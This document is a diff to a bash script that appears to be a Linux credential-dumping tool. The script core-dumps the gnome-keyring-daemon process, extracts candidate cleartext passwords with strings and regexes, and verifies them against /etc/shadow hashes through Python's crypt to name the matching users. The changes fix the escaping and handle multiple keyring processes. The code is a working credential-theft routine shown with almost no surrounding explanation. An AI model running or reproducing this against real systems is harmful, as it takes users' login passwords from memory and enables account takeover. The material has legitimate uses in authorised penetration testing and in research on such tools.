@@ -30,26 +30,26 @@ while read -r line; do
 	if [[ $2 ]]; then
 		#get ctype
 		CTYPE="$(echo $2 | cut -c-3)"
-		#Escape quotes to pass into crypt
-		SAFE="$(echo $line | sed 's/\"/\\"/g')"
+		#Escape quotes, backslashes, single quotes to pass into crypt
+		SAFE=$(echo $line | sed 's/\\/\\\\/; s/\"/\\"/; s/'"'"'/\\'"'"'/;')
 		CRYPT="\"$SAFE\", \"$CTYPE$3\""
 		if [[ `python -c "import crypt; print crypt.crypt($CRYPT)"` == $2 ]]; then
 			#Find which user's password it is (useful if used more than once!)
 			USER="$(cat /etc/shadow | grep ${2} | cut -d':' -f 1)"
-			export RESULTS="$RESULTS$4			$USER:$line\n"
+			export RESULTS="$RESULTS$4			$USER:$line \n"
 		fi
 	#Else use shadow hashes
 	elif [[ $SHADOWHASHES ]]; then
 		while read -r thishash; do
 			CTYPE="$(echo $thishash | cut -c-3)"
 			SHADOWSALT="$(echo $thishash | cut -d'$' -f 3)"
-			#Escape quotes to pass into crypt
-			SAFE="$(echo $line | sed 's/\"/\\"/g')"
+			#Escape quotes, backslashes, single quotes to pass into crypt
+			SAFE=$(echo $line | sed 's/\\/\\\\/; s/\"/\\"/; s/'"'"'/\\'"'"'/;')
 			CRYPT="\"$SAFE\", \"$CTYPE$SHADOWSALT\""
 			if [[ `python -c "import crypt; print crypt.crypt($CRYPT)"` == $thishash ]]; then
 				#Find which user's password it is (useful if used more than once!)
 				USER="$(cat /etc/shadow | grep ${thishash} | cut -d':' -f 1)"
-				export RESULTS="$RESULTS$4			$USER:$line\n"
+				export RESULTS="$RESULTS$4			$USER:$line \n"
 			fi
 		done <<< "$SHADOWHASHES"
 	#if no hash data - revert to checking probability
@@ -110,17 +110,22 @@ if [[ `uname -a | awk '{print tolower($0)}'` == *"ubuntu"* ]]; then
         SOURCE="[SYSTEM - GNOME]"
         #get /usr/bin/gnome-keyring-daemon process
         PID="$(ps -eo pid,command | sed -rn '/gnome\-keyring\-daemon/p' | awk 'BEGIN {FS = " " } ; { print $1 }')"
-        gcore -o /tmp/dump $PID >& /dev/null
-        HASH="$(strings "/tmp/dump.${PID}" | egrep -m 1 '^\$.\$.+$')"
-        SALT="$(echo $HASH | cut -d'$' -f 3)"
-        DUMP=$(strings "/tmp/dump.${PID}" | egrep '^.+libgck\-1\.so\.0$' -B 10 -A 10)
-        DUMP+=$(strings "/tmp/dump.${PID}" | egrep -A 5 -B 5 'libgcrypt\.so\..+$')
-	#Remove dupes to speed up processing
-	DUMP=$(echo $DUMP | tr " " "\n" |sort -u)
-	parse_pass "$DUMP" "$HASH" "$SALT" "$SOURCE" 
+	#if exists aka someone logged into gnome then extract...
+	if [[ $PID ]];then
+		while read -r pid; do
+		        gcore -o /tmp/dump $pid >& /dev/null
+		        HASH="$(strings "/tmp/dump.${pid}" | egrep -m 1 '^\$.\$.+$')"
+		        SALT="$(echo $HASH | cut -d'$' -f 3)"
+		        DUMP=$(strings "/tmp/dump.${pid}" | egrep '^.+libgck\-1\.so\.0$' -B 10 -A 10)
+		        DUMP+=$(strings "/tmp/dump.${pid}" | egrep -A 5 -B 5 'libgcrypt\.so\..+$')
+			#Remove dupes to speed up processing
+			DUMP=$(echo $DUMP | tr " " "\n" |sort -u)
+			parse_pass "$DUMP" "$HASH" "$SALT" "$SOURCE" 
 	
-	#cleanup
-	rm -rf "/tmp/dump.${PID}"
+			#cleanup
+			rm -rf "/tmp/dump.${pid}"
+		done <<< "$PID"
+	fi
 fi
 
 #Support VSFTPd - Active Users
